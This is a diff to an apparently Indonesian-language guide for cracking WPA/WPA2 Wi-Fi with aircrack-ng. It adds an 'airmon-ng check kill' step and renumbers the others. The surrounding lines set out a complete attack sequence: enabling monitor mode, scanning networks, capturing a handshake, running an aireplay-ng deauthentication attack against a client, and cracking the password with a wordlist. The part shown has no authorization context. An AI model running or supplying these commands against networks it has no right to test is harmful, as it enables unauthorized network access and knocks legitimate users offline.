@@ -351,7 +351,13 @@ sudo airmon-ng
 sudo airmon-ng check
 ```
 
-#### 3. Aktifkan mode monitor:
+#### 3. Matikan proses yang mengganggu mode monitor:
+
+```bash
+sudo airmon-ng check kill
+```
+
+#### 4. Aktifkan mode monitor:
 
 ```bash
 sudo airmon-ng start wlan2
@@ -359,25 +365,25 @@ sudo airmon-ng start wlan2
 
 Setelah mode monitor aktif, nama interface `wlan2` akan berubah menjadi `wlan2mon`.
 
-#### 4. Scan jaringan Wi-Fi WPA/WPA2:
+#### 5. Scan jaringan Wi-Fi WPA/WPA2:
 
 ```bash
 sudo airodump-ng wlan2mon
 ```
 
-#### 5. Capture handshake WPA/WPA2:
+#### 6. Capture handshake WPA/WPA2:
 
 ```bash
 sudo airodump-ng -d [bssid] -c [channel] -w [output] wlan2mon
 ```
 
-#### 6. Jalankan serangan deauthentication:
+#### 7. Jalankan serangan deauthentication:
 
 ```bash
 sudo aireplay-ng -0 10 -a [bssid] -c [mac_client] wlan2mon
 ```
 
-#### 7. Crack password WPA/WPA2:
+#### 8. Crack password WPA/WPA2:
 
 ```bash
 aircrack-ng -a 2 [file_capture] -w [wordlist]
